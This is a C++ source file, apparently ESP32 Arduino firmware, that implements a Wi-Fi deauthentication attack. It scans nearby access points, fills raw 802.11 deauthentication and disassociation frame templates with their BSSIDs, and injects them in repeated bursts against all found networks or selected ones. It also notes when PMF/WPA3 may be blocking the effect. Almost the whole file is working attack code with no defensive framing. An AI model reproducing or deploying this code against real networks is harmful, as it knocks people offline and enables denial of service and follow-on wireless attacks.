/**
 * @file deauth_attack.cpp
 * @brief Deauthentication attack implementation
 */

#include "deauth_attack.h"
#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_system.h"
#include "esp_random.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/portmacro.h"
#include <stdio.h>
#include <string.h>
#include <inttypes.h>
#include <stdlib.h>

extern "C" {

#if !defined(MAX_WIFI_CHANNEL)
#define MAX_WIFI_CHANNEL 13
#endif

#define MAX_ATTACK_APS 25

static uint32_t deauth_packets_sent = 0;
static TaskHandle_t deauth_task_handle = NULL;
static TaskHandle_t deauth_station_task_handle = NULL;
static bool deauth_task_running = false;
static volatile bool deauth_stop_requested = false;
static volatile bool deauth_station_stop_requested = false;
static uint32_t deauth_start_time_ms = 0;  // Track attack start time for PMF detection
static int deauth_current_channel = 0;     // Track locked channel for display

static wifi_ap_record_t attack_aps[MAX_ATTACK_APS];
static uint16_t attack_ap_count = 0;

static wifi_ap_record_t selected_ap_local;
static wifi_ap_record_t *selected_aps_local = NULL;
static int selected_ap_count_local = 0;

static void deauth_task(void *param);
static void wifi_tx_prepare_ap_mode(void);
static void wifi_tx_restore_sta_mode(void);

static void attack_scan_aps(void) {
  attack_ap_count = 0;
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(false, true);
  int n = WiFi.scanNetworks(false, true);
  if (n <= 0) {
    WiFi.scanDelete();
    return;
  }
  attack_ap_count = (n > MAX_ATTACK_APS) ? MAX_ATTACK_APS : (uint16_t)n;
  for (int i = 0; i < attack_ap_count; i++) {
    memcpy(attack_aps[i].bssid, WiFi.BSSID(i), 6);
    attack_aps[i].primary = WiFi.channel(i);
    attack_aps[i].rssi = WiFi.RSSI(i);
    String raw = WiFi.SSID(i);
    strncpy((char *)attack_aps[i].ssid, raw.c_str(), 32);
    attack_aps[i].ssid[32] = '\0';
  }
  WiFi.scanDelete();
}

static void wifi_tx_prepare_ap_mode(void) {
  // Use low-level esp_wifi APIs only; avoid Arduino WiFi.mode()/WiFi.disconnect()
  esp_wifi_disconnect();
  vTaskDelay(pdMS_TO_TICKS(50));
  esp_wifi_stop();
  vTaskDelay(pdMS_TO_TICKS(100));

  // Set APSTA mode to support raw frame injection
  esp_wifi_set_mode(WIFI_MODE_APSTA);
  
  wifi_config_t ap_config = {};
  esp_wifi_set_config(WIFI_IF_AP, &ap_config);
  esp_wifi_start();
  vTaskDelay(pdMS_TO_TICKS(200));
  
  // Enable promiscuous mode for raw frame transmission (REQUIRED for deauth frames)
  esp_wifi_set_promiscuous(true);
  vTaskDelay(pdMS_TO_TICKS(50));
  Serial.println("[DEAUTH] Promiscuous mode enabled");
}

static void wifi_tx_restore_sta_mode(void) {
  // Disable promiscuous mode
  esp_wifi_set_promiscuous(false);
  vTaskDelay(pdMS_TO_TICKS(50));
  Serial.println("[DEAUTH] Promiscuous mode disabled");
  
  // Restore STA mode using esp_wifi APIs (avoid Arduino wrappers)
  esp_wifi_stop();
  vTaskDelay(pdMS_TO_TICKS(100));
  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  vTaskDelay(pdMS_TO_TICKS(100));
}

static void sanitize_ssid(const uint8_t *input_ssid, char *output_buffer, size_t buffer_size) {
  char temp_ssid[33];
  memcpy(temp_ssid, input_ssid, 32);
  temp_ssid[32] = '\0';
  if (strlen(temp_ssid) == 0) {
    snprintf(output_buffer, buffer_size, "[Hidden]");
  } else {
    snprintf(output_buffer, buffer_size, "%s", temp_ssid);
  }
}

// Deauthentication frame template
// Frame Control: 0xC0 (Management, Deauth), 0x00
// Duration: 0x00, 0x00
// Destination MAC: [4-9] (will be filled with target MAC or FF:FF:FF:FF:FF:FF)
// Source MAC: [10-15] (will be filled with AP BSSID)
// BSSID: [16-21] (will be filled with AP BSSID)
// Sequence: [22-23] (will be randomized)
// Reason: [24-25] (0x07 = Class 3 frame from non-associated STA)
static const uint8_t deauth_packet_template[26] = {
  0xc0, 0x00, 0x00, 0x00,  // Frame control + Duration (fixed)
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Destination MAC (broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source MAC (will be AP BSSID)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (will be AP BSSID)
  0x00, 0x00, 0x07, 0x00               // Sequence + Reason Code
};

// Disassociation frame template
static const uint8_t disassoc_packet_template[26] = {
  0xa0, 0x00, 0x00, 0x00,  // Frame control + Duration (fixed)
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Destination MAC (broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source MAC (will be AP BSSID)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (will be AP BSSID)
  0x00, 0x00, 0x07, 0x00               // Sequence + Reason Code
};

esp_err_t deauth_attack_broadcast(uint8_t bssid[6], int channel, uint8_t mac[6]) {
  wifi_second_chan_t second = WIFI_SECOND_CHAN_NONE;
  esp_err_t err = esp_wifi_set_channel(channel, second);
  if (err != ESP_OK) {
    Serial.printf("[DEAUTH] Failed to set channel %d: %s\n", channel, esp_err_to_name(err));
  }
  deauth_current_channel = channel;

  uint8_t deauth_frame[sizeof(deauth_packet_template)];
  uint8_t disassoc_frame[sizeof(disassoc_packet_template)];
  memcpy(deauth_frame, deauth_packet_template, sizeof(deauth_packet_template));
  memcpy(disassoc_frame, disassoc_packet_template, sizeof(disassoc_packet_template));

  bool is_broadcast = true;
  for (int i = 0; i < 6; i++) {
    if (mac[i] != 0xFF) {
      is_broadcast = false;
      break;
    }
  }

  memcpy(&deauth_frame[4], mac, 6);
  memcpy(&disassoc_frame[4], mac, 6);
  memcpy(&deauth_frame[10], bssid, 6);
  memcpy(&deauth_frame[16], bssid, 6);
  memcpy(&disassoc_frame[10], bssid, 6);
  memcpy(&disassoc_frame[16], bssid, 6);

  uint16_t seq = (esp_random() & 0xFFF) << 4;
  deauth_frame[22] = seq & 0xFF;
  deauth_frame[23] = (seq >> 8) & 0xFF;
  disassoc_frame[22] = seq & 0xFF;
  disassoc_frame[23] = (seq >> 8) & 0xFF;

  esp_err_t tx_err;
  tx_err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
  if (tx_err == ESP_OK) deauth_packets_sent++;
  tx_err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
  if (tx_err == ESP_OK) deauth_packets_sent++;
  tx_err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
  if (tx_err == ESP_OK) deauth_packets_sent++;
  tx_err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
  if (tx_err == ESP_OK) deauth_packets_sent++;

  if (!is_broadcast) {
    memcpy(&deauth_frame[4], bssid, 6);
    memcpy(&deauth_frame[10], mac, 6);
    memcpy(&deauth_frame[16], bssid, 6);
    memcpy(&disassoc_frame[4], bssid, 6);
    memcpy(&disassoc_frame[10], mac, 6);
    memcpy(&disassoc_frame[16], bssid, 6);

    seq = (esp_random() & 0xFFF) << 4;
    deauth_frame[22] = seq & 0xFF;
    deauth_frame[23] = (seq >> 8) & 0xFF;
    disassoc_frame[22] = seq & 0xFF;
    disassoc_frame[23] = (seq >> 8) & 0xFF;

    tx_err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
    if (tx_err == ESP_OK) deauth_packets_sent++;
    tx_err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
    if (tx_err == ESP_OK) deauth_packets_sent++;
    tx_err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
    if (tx_err == ESP_OK) deauth_packets_sent++;
    tx_err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
    if (tx_err == ESP_OK) deauth_packets_sent++;
  }

  return ESP_OK;
}

static void deauth_task(void *param) {
  (void)param;

  if (attack_ap_count == 0) {
    Serial.println("[DEAUTH] No access points found");
    deauth_task_running = false;
    deauth_task_handle = NULL;
    deauth_stop_requested = false;
    vTaskDelete(NULL);
    return;
  }

  wifi_ap_record_t *ap_info = attack_aps;
  uint32_t last_log = 0;
  bool pmf_warning_shown = false;
  uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  
  deauth_start_time_ms = millis();
  Serial.printf("[DEAUTH] Attack started at %lu ms\n", deauth_start_time_ms);

  while (!deauth_stop_requested) {
    if (selected_ap_count_local > 0 && selected_aps_local != NULL) {
      for (int sel_idx = 0; sel_idx < selected_ap_count_local; sel_idx++) {
        for (int i = 0; i < attack_ap_count; i++) {
          if (memcmp(ap_info[i].bssid, selected_aps_local[sel_idx].bssid, 6) == 0) {
            int ch = ap_info[i].primary;
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            for (int burst = 0; burst < 25; burst++) {
              deauth_attack_broadcast(ap_info[i].bssid, ch, broadcast_mac);
            }
            vTaskDelay(pdMS_TO_TICKS(5));
          }
        }
      }
    } else if (strlen((const char *)selected_ap_local.ssid) > 0) {
      for (int i = 0; i < attack_ap_count; i++) {
        if (strcmp((char *)ap_info[i].ssid, (char *)selected_ap_local.ssid) == 0) {
          int ch = ap_info[i].primary;
          char bssid_str[18];
          snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
            ap_info[i].bssid[0], ap_info[i].bssid[1], ap_info[i].bssid[2],
            ap_info[i].bssid[3], ap_info[i].bssid[4], ap_info[i].bssid[5]);
          Serial.printf("[DEAUTH] Channel: %d, Target: %s\n", ch, bssid_str);
          esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
          for (int burst = 0; burst < 25; burst++) {
            deauth_attack_broadcast(ap_info[i].bssid, ch, broadcast_mac);
          }
          vTaskDelay(pdMS_TO_TICKS(10));
        }
      }
    } else {
      for (int i = 0; i < attack_ap_count && !deauth_stop_requested; i++) {
        int ch = ap_info[i].primary;
        char bssid_str[18];
        snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
          ap_info[i].bssid[0], ap_info[i].bssid[1], ap_info[i].bssid[2],
          ap_info[i].bssid[3], ap_info[i].bssid[4], ap_info[i].bssid[5]);
        Serial.printf("[DEAUTH] Channel: %d, Target: %s\n", ch, bssid_str);
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        for (int burst = 0; burst < 25; burst++) {
          deauth_attack_broadcast(ap_info[i].bssid, ch, broadcast_mac);
        }
        vTaskDelay(pdMS_TO_TICKS(5));
      }
    }
    vTaskDelay(pdMS_TO_TICKS(10));
    uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
    if (now - last_log >= 5000) {
      Serial.printf("[DEAUTH] %" PRIu32 " packets/sec\n", deauth_packets_sent / 5);
      deauth_packets_sent = 0;
      last_log = now;
    }
    
    // PMF detection: after 3 seconds with no visible effect, show warning
    if (!pmf_warning_shown && (millis() - deauth_start_time_ms) >= 3000) {
      Serial.println("[DEAUTH] No client drops observed after 3s — AP may have PMF/WPA3 enabled");
      pmf_warning_shown = true;
    }
  }
  deauth_task_running = false;
  deauth_stop_requested = false;
  deauth_task_handle = NULL;
  vTaskDelete(NULL);
}

void deauth_attack_start(void) {
  if (!deauth_task_running) {
    Serial.println("[DEAUTH] start called");
    attack_scan_aps();
    if (attack_ap_count == 0) {
      Serial.println("No APs found — run a WiFi scan first");
      return;
    }

    Serial.println("[DEAUTH] calling wifi_tx_prepare_ap_mode");
    wifi_tx_prepare_ap_mode();
    Serial.println("[DEAUTH] wifi_tx_prepare_ap_mode done");

    Serial.println("[DEAUTH] Restarting Wi-Fi for deauth");

    selected_ap_count_local = 0;
    selected_aps_local = NULL;
    memset(&selected_ap_local, 0, sizeof(selected_ap_local));

    Serial.printf("[DEAUTH] Starting deauth attack on %d AP(s)\n", attack_ap_count);

    deauth_stop_requested = false;
    Serial.println("[DEAUTH] creating task");
    BaseType_t rc = xTaskCreate(deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle);
    if (rc != pdPASS) {
      Serial.printf("Failed to start deauth task (%ld)\n", (long)rc);
      deauth_task_handle = NULL;
      deauth_stop_requested = false;
      wifi_tx_restore_sta_mode();
      return;
    }
    deauth_task_running = true;
    Serial.println("[DEAUTH] task created");
  } else {
    Serial.println("Deauth already running.");
  }
}

void deauth_attack_stop(void) {
  if (deauth_task_running) {
    Serial.println("Stopping deauth transmission...");
    deauth_stop_requested = true;

    if (deauth_task_handle != NULL) {
      int wait_count = 0;
      while (deauth_task_handle != NULL && wait_count < 100) {
        vTaskDelay(pdMS_TO_TICKS(10));
        wait_count++;
      }
    }

    deauth_task_running = false;
    deauth_stop_requested = false;
    wifi_tx_restore_sta_mode();
  }
}

void deauth_attack_start_station(void) {
  deauth_attack_start();
}

bool deauth_attack_stop_station(void) {
  return false;
}

void deauth_attack_auto(void) {
  deauth_attack_start();
}

uint32_t deauth_attack_get_packets_sent(void) {
  return deauth_packets_sent;
}

void deauth_attack_reset_packet_counter(void) {
  deauth_packets_sent = 0;
}

bool deauth_attack_is_running(void) {
  return deauth_task_running || deauth_station_task_handle != NULL;
}

int deauth_attack_get_current_channel(void) {
  return deauth_current_channel;
}

uint32_t deauth_attack_get_elapsed_ms(void) {
  if (deauth_attack_is_running()) {
    return millis() - deauth_start_time_ms;
  }
  return 0;
}

} // extern "C"
